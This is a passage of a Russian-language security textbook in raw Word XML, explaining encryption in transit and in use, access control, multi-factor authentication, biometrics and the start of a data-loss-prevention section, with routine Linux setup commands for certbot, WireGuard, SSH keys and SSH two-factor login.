        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>HTTPS (HTTP over TLS/SSL)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (подробности в главе 9.02):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент (браузер) подключается к серверу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер отправляет **SSL-сертификат** (содержит публичный ключ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Браузер проверяет сертификат (подписан ли доверенным CA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Генерируется **сессионный ключ** (симметричный) для шифрования трафика</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Все данные (пароли, номера карт, cookie) шифруются **AES-256**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример настройки HTTPS (Let's Encrypt)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Установить Certbot (бесплатные сертификаты от Let's Encrypt)</w:t>
        <w:br/>
        <w:t>sudo apt install certbot python3-certbot-nginx</w:t>
        <w:br/>
        <w:t># Получить сертификат для домена example.com</w:t>
        <w:br/>
        <w:t>sudo certbot --nginx -d example.com</w:t>
        <w:br/>
        <w:t># Автоматически обновлять сертификат каждые 3 месяца</w:t>
        <w:br/>
        <w:t>sudo systemctl enable certbot.timer</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зелёный замочек в браузере</w:t>
      </w:r>
      <w:r>
        <w:t>: означает, что соединение зашифровано + сертификат подтверждён.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: HTTP (без S) — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>открытый текст</w:t>
      </w:r>
      <w:r>
        <w:t>. Любой сосед по Wi-Fi может перехватить пароли с помощью Wireshark.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>VPN (Virtual Private Network)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Шифровать весь трафик от компьютера до VPN-сервера. Используется для:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Удалённой работы**: подключение к корпоративной сети из дома</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обход блокировок**: YouTube в Китае, Pornhub в России (после блокировок)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Защита в публичных Wi-Fi**: в кафе/аэропорту/отеле перехватывают трафик</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные протоколы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**OpenVPN** (open-source, медленнее)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**WireGuard** (новый, быстрый, безопасный) — используется в Mullvad, ProtonVPN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**IPsec** (для корпоративных VPN)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример подключения к WireGuard</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Установить WireGuard</w:t>
        <w:br/>
        <w:t>sudo apt install wireguard</w:t>
        <w:br/>
        <w:t># Создать конфиг /etc/wireguard/wg0.conf</w:t>
        <w:br/>
        <w:t>[Interface]</w:t>
        <w:br/>
        <w:t>PrivateKey = &lt;твой приватный ключ&gt;</w:t>
        <w:br/>
        <w:t>Address = 10.0.0.2/24</w:t>
        <w:br/>
        <w:br/>
        <w:t>[Peer]</w:t>
        <w:br/>
        <w:t>PublicKey = &lt;публичный ключ сервера&gt;</w:t>
        <w:br/>
        <w:t>Endpoint = vpn.example.com:51820</w:t>
        <w:br/>
        <w:t>AllowedIPs = 0.0.0.0/0  # весь трафик через VPN</w:t>
        <w:br/>
        <w:br/>
        <w:t># Запустить VPN</w:t>
        <w:br/>
        <w:t>sudo wg-quick up wg0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус VPN</w:t>
      </w:r>
      <w:r>
        <w:t>: Провайдер VPN видит весь твой трафик. Если VPN-провайдер не надёжен (бесплатный VPN из Google Play) → он сам может продавать твои данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>SSH (Secure Shell)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Удалённое управление серверами. Все команды и данные шифруются.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется **асимметричное шифрование** (RSA, Ed25519)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вместо паролей — **SSH-ключи** (публичный ключ на сервере, приватный у тебя)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример настройки SSH-ключа:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Генерируем пару ключей</w:t>
        <w:br/>
        <w:t>ssh-keygen -t ed25519 -C "твой_email@example.com"</w:t>
        <w:br/>
        <w:t># Копируем публичный ключ на сервер</w:t>
        <w:br/>
        <w:t>ssh-copy-id user@server.com</w:t>
        <w:br/>
        <w:t># Теперь подключаемся без пароля</w:t>
        <w:br/>
        <w:t>ssh user@server.com</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t>: Приватный ключ (`~/.ssh/id_ed25519`) нельзя никому показывать. Если кто-то украл твой приватный ключ → он может зайти на все твои серверы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование в использовании (Data in Use)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Шифрование данных </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в оперативной памяти</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> во время обработки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Обычное шифрование защищает данные на диске и в сети, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не в RAM</w:t>
      </w:r>
      <w:r>
        <w:t>. Если хакер получил доступ к серверу (через уязвимость, физический доступ) → он может прочитать данные из памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение — Confidential Computing:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Intel SGX** (Software Guard Extensions) — изолированная область памяти (enclave), куда даже ОС не может заглянуть</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**AMD SEV** (Secure Encrypted Virtualization) — шифрование памяти виртуальных машин</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ARM TrustZone** — изолированная среда на мобильных устройствах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример использования</w:t>
      </w:r>
      <w:r>
        <w:t>: Google Cloud, Microsoft Azure используют SGX/SEV для защиты конфиденциальных вычислений (обработка медицинских данных, финансовые расчёты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус</w:t>
      </w:r>
      <w:r>
        <w:t>: Сложно реализовать, требует поддержки процессора, медленнее обычной обработки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4.2. Контроль доступа: Кто, что и когда может делать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Шифрование — это круто, но недостаточно. Нужно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ограничить доступ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> к данным. Принцип: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не все должны видеть всё</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Принцип наименьших привилегий (Least Privilege)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Каждый пользователь/процесс должен иметь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>минимально необходимые права</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для выполнения своих задач.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хорошо**: Разработчик имеет доступ к тестовой БД, но **не** к продакшн-БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Плохо**: Все сотрудники имеют права администратора (admin) → один клик на вредоносный файл → ransomware зашифровал все серверы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Colonial Pipeline (2021) — ransomware зашифровал серверы. Почему? Потому что хакеры получили </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>учётную запись с правами администратора</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> через утечку пароля. Если бы у этой учётки были ограничены права → ransomware не смог бы зашифровать критические системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>RBAC (Role-Based Access Control)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Права доступа назначаются </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>по ролям</w:t>
      </w:r>
      <w:r>
        <w:t>, а не каждому пользователю отдельно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Роль "Бухгалтер"**: может читать финансовые отчёты, редактировать счета</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Роль "Разработчик"**: может читать/писать код, деплоить на тестовый сервер</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Роль "Администратор"**: может делать всё</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проще управлять правами (добавил нового бухгалтера → назначил роль "Бухгалтер")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Меньше ошибок (не забудешь отозвать права при увольнении)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример в Linux:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Создать группу "developers"</w:t>
        <w:br/>
        <w:t>sudo groupadd developers</w:t>
        <w:br/>
        <w:t># Добавить пользователя в группу</w:t>
        <w:br/>
        <w:t>sudo usermod -aG developers alice</w:t>
        <w:br/>
        <w:t># Назначить права на папку /var/www/project только группе developers</w:t>
        <w:br/>
        <w:t>sudo chown -R :developers /var/www/project</w:t>
        <w:br/>
        <w:t>sudo chmod 770 /var/www/project</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>MFA (Multi-Factor Authentication) — Многофакторная аутентификация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Для входа требуется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>два или более фактора</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что ты знаешь**: пароль, PIN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что у тебя есть**: смартфон (Google Authenticator), USB-ключ (YubiKey)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Кто ты**: биометрия (отпечаток пальца, Face ID)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если хакер украл пароль (через фишинг, утечку) → он всё равно не сможет войти без второго фактора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статистика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: MFA блокирует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>99.9%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> автоматических атак (Microsoft, 2020).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры MFA:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**TOTP** (Time-based One-Time Password):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Приложение: Google Authenticator, Authy, Microsoft Authenticator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Генерирует 6-значный код, который меняется каждые 30 секунд</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Основан на **общем секрете** (QR-код при настройке)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Секрет: JBSWY3DPEHPK3PXP (base32)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Текущее время: 1700000000 (Unix timestamp)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Интервал: 1700000000 / 30 = 56666666 (номер интервала)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   HMAC-SHA1(секрет, 56666666) → берём последние 6 цифр → 123456</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**SMS-коды**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Код приходит на телефон</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минус**: SMS можно перехватить (SIM-swapping — хакер переводит твой номер на свою SIM)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аппаратные ключи (YubiKey, Titan Security Key)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>USB-устройство, которое подтверждает вход</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Плюс**: невозможно украсть удалённо</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минус**: если потерял ключ → не войдёшь в аккаунт (нужен backup-ключ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример настройки 2FA в Linux (SSH)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Установить Google Authenticator</w:t>
        <w:br/>
        <w:t>sudo apt install libpam-google-authenticator</w:t>
        <w:br/>
        <w:t># Запустить настройку</w:t>
        <w:br/>
        <w:t>google-authenticator</w:t>
        <w:br/>
        <w:t># Редактировать /etc/pam.d/sshd, добавить строку:</w:t>
        <w:br/>
        <w:t>auth required pam_google_authenticator.so</w:t>
        <w:br/>
        <w:t># Редактировать /etc/ssh/sshd_config:</w:t>
        <w:br/>
        <w:t>ChallengeResponseAuthentication yes</w:t>
        <w:br/>
        <w:t># Перезапустить SSH</w:t>
        <w:br/>
        <w:t>sudo systemctl restart sshd</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Теперь при входе по SSH нужен </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пароль + код из Google Authenticator</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Биометрия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отпечаток пальца** (Touch ID, сканер в смартфоне)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Распознавание лица** (Face ID, Windows Hello)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сканирование радужной оболочки глаза** (в некоторых банках)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Голос** (Alexa, Google Assistant — используют для разблокировки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не нужно запоминать пароль</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложно украсть (ну, в теории)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Невозможно изменить**: Если хакер украл твой отпечаток пальца (скопировал с кружки) → ты не можешь "сменить пароль"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**False positives/negatives**: Face ID иногда не распознаёт тебя (если ты побрился/надел очки/лежишь в темноте)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обход**: Исследователи взломали Face ID с помощью маски (3D-принтер + фото)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Биометрию лучше использовать как </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>второй фактор</w:t>
      </w:r>
      <w:r>
        <w:t>, а не единственный.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.4.3. DLP (Data Loss Prevention) — Предотвращение утечек</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Система контроля и блокировки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> передачи конфиденциальных данных за пределы организации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Чтобы сотрудник не смог случайно (или специально) слить базу клиентов на личный Gmail, скопировать на флешку, распечатать на принтере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Типы DLP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Network DLP** (сетевой):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
